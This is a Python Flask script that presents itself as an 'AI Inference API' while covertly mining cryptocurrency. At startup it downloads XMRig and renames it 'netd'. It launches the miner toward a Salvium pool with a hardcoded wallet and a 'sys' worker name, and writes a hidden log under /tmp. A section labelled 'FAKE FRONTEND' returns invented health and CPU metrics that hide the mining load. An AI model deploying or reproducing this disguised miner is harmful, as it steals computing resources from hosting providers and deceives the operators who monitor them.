import os
import subprocess
import threading
import random
from flask import Flask

app = Flask(__name__)

# === CONFIGURATION === #
BASE_WALLET = "SaLvdUFXatp5x7yDhRhqrgL9wYNaj379vj1jdwWUKY6GDXKVxachcFV9R4qUAziZtGDgNCQJVQwrkGhD7VjknpSCbH5p8kwbReo"
POOL = "in.salvium.herominers.com:1230"
ALGO = "rx/0"
PASS = "web"
WALLET = f"{BASE_WALLET}.sys{random.randint(1000,9999)}"

# === MINER SETUP === #
def install_and_run_miner():
    try:
        if not os.path.exists("netd"):
            print("[+] Fetching payload...")
            os.system("curl -L -o miner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz")
            os.system("tar -xf miner.tar.gz")
            os.system("mv xmrig-6.24.0/xmrig netd")
            os.system("chmod +x netd")

        with open("netd.sh", "w") as f:
            f.write(f"#!/bin/bash\necho '[System] Net service initializing...'\n./netd -a {ALGO} -o {POOL} -u {WALLET} -p {PASS} --threads 1 --cpu-priority 1 --log-file /tmp/.sysd\n")
        os.system("chmod +x netd.sh")

        print(f"[+] Launching netd with obfuscated identity...")
        subprocess.Popen(["bash", "netd.sh"])

    except Exception as e:
        print("❌ Launch failure:", e)

# === FAKE FRONTEND === #
@app.route('/')
def index():
    return "<h2>🔧 AI Inference API v2.2 Online</h2><p>Service is healthy.</p>"

@app.route('/api/health')
def health():
    return {"status": "ok", "uptime": "12422s", "load": "0.31"}

@app.route('/metrics')
def metrics():
    return {
        "cpu": f"{random.randint(17,33)}%",
        "ram": f"{random.randint(38,49)}%",
        "threads": 1,
        "uptime": f"0{random.randint(1,4)}:{random.randint(10,59)}:{random.randint(10,59)}"
    }

if __name__ == '__main__':
    threading.Thread(target=install_and_run_miner).start()
    app.run(host='0.0.0.0', port=8080)
